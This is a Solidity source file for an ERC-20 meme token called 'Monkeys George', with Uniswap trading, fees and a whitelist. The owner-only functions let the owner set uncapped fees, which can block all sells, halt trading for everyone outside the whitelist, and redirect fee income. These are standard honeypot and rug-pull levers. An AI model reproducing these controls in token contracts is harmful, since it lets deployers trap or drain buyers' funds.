// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, " multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "new owner is zero address");
        _owner = newOwner;
        emit OwnershipTransferred(_owner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract Monkeys is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1_000_000_000_000 * 10**_decimals;

    uint256 private constant percent = _totalSupply / 100; //1%
    uint256 public maxAmount = _totalSupply;

    uint256 private _tax;
    uint256 public feeBuy = 1;
    uint256 public feeSell = 1;

    string private constant _name = "Monkeys George";
    string private constant _symbol = "MONKEYS";

    IUniswapV2Router02 private constant uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapV2Pair;

    address payable private feeAddress;
    mapping(address => bool) private _isWl;

    bool private enable = false;

    constructor() {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        feeAddress = payable(0xE8Be61d58E12f5790E4C199C1B5AafBb78aF7CC9);

        _isWl[_msgSender()] = true;
        _isWl[feeAddress] = true;
        _isWl[address(this)] = true;

        _allowances[_msgSender()][address(uniswapV2Router)] = ~uint256(0);
        _balance[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "low allowance")
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(
            owner != address(0) && spender != address(0),
            "approve zero address"
        );
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "transfer zero address");

        if (_isWl[from] || _isWl[to]) {
            _tax = 0;
        } else {
            require(enable, "Wait till enable");
            if (from == uniswapV2Pair) {
                require(
                    balanceOf(to) + amount <= maxAmount,
                    "Max wallet invalid"
                );
                _tax = feeBuy;
            } else if (to == uniswapV2Pair) {
                _tax = feeSell;
            } else {
                _tax = 0;
            }
        }

        uint256 taxTokens = (amount * _tax) / 100;
        uint256 transferAmount = amount - taxTokens;

        _balance[from] = _balance[from] - amount;
        _balance[to] = _balance[to] + transferAmount;
        _balance[address(feeAddress)] =
            _balance[address(feeAddress)] +
            taxTokens;

        emit Transfer(from, to, transferAmount);
    }

    function setWl(address[] memory batch) external onlyOwner {
        for (uint8 i = 0; i < batch.length; i++) {
            _isWl[batch[i]] = true;
        }
    }

    function removeWl(address _address) external onlyOwner {
        _isWl[_address] = false;
    }

    function enableTrading() external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        enable = true;
    }

    function disableTrading() external onlyOwner {
        enable = false;
    }

    function setFeeAddress(address _newAddress) external onlyOwner {
        feeAddress = payable(_newAddress);
    }

    function setFee(uint256 _feeBuy, uint256 _feeSell) external onlyOwner {
        feeBuy = _feeBuy;
        feeSell = _feeSell;
    }

    function setLimitPercent(uint8 _percent) external onlyOwner {
        maxAmount = _percent * percent;
    }

    function removeLimits() external onlyOwner {
        maxAmount = _totalSupply;
    }

    receive() external payable {}
}